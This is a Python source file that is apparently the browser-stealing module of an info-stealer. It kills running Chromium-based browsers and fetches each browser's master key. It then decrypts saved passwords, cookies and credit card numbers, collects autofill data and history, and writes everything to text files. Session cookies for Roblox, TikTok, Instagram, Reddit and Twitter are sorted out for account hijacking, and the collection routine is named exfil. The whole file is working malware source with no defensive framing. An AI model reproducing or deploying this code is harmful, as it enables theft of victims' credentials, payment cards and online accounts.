from locations.paths import Paths
from utils.decryptor import AES256Decrypt
from utils.masterkey import MasterKeyFetcher
import sqlite3 , shutil

from os.path import exists

import os , time


decrypt = AES256Decrypt.decrypt_data


def kill_browsers():
    
    for proc in ['opera.exe' , 'chrome.exe' , 'msedge.exe' , 'brave.exe' , 'chromium.exe' , 'yandex.exe']:

        os.system(f'taskkill /F /IM {proc}')




class Password:

    def __init__(self , name , password , url) -> None:


        self.name = name
        self.password = password
        self.url = url



class Cookie:

    def __init__(self , url , name , cookie , expires) -> None:
        
        self.url = url
        self.name = name
        self.cookie = cookie
        self.expires = expires



class Autofill:

    def __init__(self , name , value) -> None:

        self.name = name
        self.value = value


class CC:

    def __init__(self , name , exp_month , exp_year , cc) -> None:

        self.name = name

        self.month = exp_month

        self.year = exp_year

        self.credit_card = cc
        
        
class Gecko:

    passwords = [ ]
    history = [ ]
    autofills = [ ]
    credit_cards = [ ]
    cookies = [ ]



    def write_to_files(path : str):


        HEADER = '=' * 15

        browser_data_path = path


        os.mkdir(browser_data_path)

        passwords_path = os.path.join(browser_data_path , 'Passwords.txt')

        pass_file = open(passwords_path , 'a')

        for password_obj in Gecko.passwords:

            name , password , url = password_obj.name , password_obj.password , password_obj.url

            pass_file.write(f'{HEADER}\nURL : {url}\nName : {name}\nPassword : {password}\n')

        
        pass_file.close()

        cookies_path = os.path.join(browser_data_path , 'Cookies.txt')

        cookies_file = open(cookies_path , 'a')


        accounts_path = os.path.join(browser_data_path , 'Accounts')

        os.mkdir(accounts_path)

        for cookie_obj in Gecko.cookies:

            url , name , cookie = cookie_obj.url , cookie_obj.name , cookie_obj.cookie
            lname = name.lower()
            if '.roblosecurity' in lname:

                open(os.path.join(accounts_path , 'Roblox.txt') , 'a').write(f'Roblox Cookie : {cookie}\n')
            
            elif lname == 'sessionid' and 'tiktok' in url:
                
                open(os.path.join(accounts_path , 'Tiktok.txt') , 'a').write(f'Tiktok Cookie : {cookie}\n')

            elif lname == 'sessionid' and 'instagram' in url:

                open(os.path.join(accounts_path , 'Instagram.txt') , 'a').write(f'Instagram Cookie : {cookie}\n')

            elif name == 'reddit_session' and 'reddit' in url:

                open(os.path.join(accounts_path , 'Reddit.txt') , 'a').write(f'Reddit Cookie : {cookie}\n')

            elif name == 'auth_token' and 'twitter' in url:

                open(os.path.join(accounts_path , 'Twitter.txt') , 'a').write(f'Twitter Cookie : {cookie}\n')




            cookies_file.write(f'{HEADER}\nURL : {url}\nName : {name}\nCookie : {cookie}\n')

        
        cookies_file.close()


        history_path = os.path.join(browser_data_path , 'History.txt')

        history_file = open(history_path , 'a')


        for hUrl in Gecko.history:

            history_file.write(f'{hUrl}\n')

        
        history_file.close()


        autofills_path = os.path.join(browser_data_path , 'Autofills.txt')

        autofills_file = open(autofills_path , 'a')


        for autofill in Gecko.autofills:

            name , value = autofill.name , autofill.value


            autofills_file.write(f'{HEADER}\nName : {name}\nValue : {value}\n')

        autofills_file.close()


        ccs_path = os.path.join(browser_data_path , 'CreditCards.txt')

        ccs_file = open(ccs_path, 'a')


        for cc in Gecko.credit_cards:

            name , month , year , card = cc.name , cc.month , cc.year , cc.credit_card

            ccs_file.write(f'{HEADER}\nName : {name}\nMonth : {month}\nYear : {year}\nCredit Card : {card}\n')
        

        ccs_file.close()



    def get_passwords(browserPath : str , masterkey : bytes):


        path = os.path.join(browserPath , 'Login Data')

        conn = sqlite3.connect(path)

        cursor = conn.cursor()

        cursor.execute('SELECT password_value, username_value, origin_url FROM logins')



        for row in cursor.fetchall():

            enc_pass , name , url = row[0],row[1] , row[2]


            if not enc_pass or not name or not url: continue

            password =  Password(name , decrypt (enc_pass , masterkey) , url)
           
            Gecko.passwords.append(password)




    
    def get_cookies(browserPath : str , masterkey : bytes):
        try:
            path = os.path.join(browserPath , 'Network' , 'Cookies')

            conn = sqlite3.connect(path)

            cursor = conn.cursor()

            cursor.execute('SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies')

            try:
                for row in cursor.fetchall():

                    url , name , enc_cookie , expires = row[0] , row[1] , row[3] , row[4]


                    try:
                        
                        cookie = Cookie(url , name , decrypt (enc_cookie , masterkey) , expires)

                        Gecko.cookies.append(cookie)

                        
                    except:

                        continue
            except:

                pass
        except Exception:

            pass
     

    

    def get_history(browserPath : str):

        path = os.path.join(browserPath , 'History')

        try:

            conn = sqlite3.connect(path)
            
            cursor = conn.cursor()

            cursor.execute('SELECT url from urls')


            for row in cursor.fetchall():

                url = row[0]

                
                Gecko.history.append(url)
        except:

            pass

    



    def get_autofills(browserPath : str):

        path = os.path.join(browserPath , 'Web Data')

        conn = sqlite3.connect(path)
        
        cursor = conn.cursor()


        cursor.execute('SELECT name , value from autofill')


        for row in cursor.fetchall():

            name , value = row[0] , row[1]
            autofill = Autofill(name , value)
            Gecko.autofills.append(autofill)

    

    def get_ccs(browserPath : str , masterkey : bytes):
      
        path = os.path.join(browserPath , 'Web Data')

        conn = sqlite3.connect(path)
        
        cursor = conn.cursor()


        cursor.execute('SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards')


        for row in cursor.fetchall():

            name , exp_month , exp_year , cc_enc = row[0] , row[1] , row[2] , row[3]


            cc = CC(name , exp_month , exp_year , decrypt (cc_enc , masterkey))


            Gecko.credit_cards.append(cc)
        










    def exfil(vpath):

        kill_browsers()

        for path in Paths.BROWSERS.get('Core'):

            
            if not exists(path):

                continue


            mk_path = os.path.join(path , '..' , 'Local State')

            if 'Opera' in path:
            
                mk_path = os.path.join(path  , 'Local State')


            if not exists(mk_path):

                continue

            
            

            masterkey = MasterKeyFetcher.get_master_key(mk_path)

            
            Gecko.get_passwords(path , masterkey)

            Gecko.get_cookies(path , masterkey)

            Gecko.get_history(path)

            Gecko.get_autofills(path)

            Gecko.get_ccs(path , masterkey)


        Gecko.write_to_files(vpath)

            
            

    

    

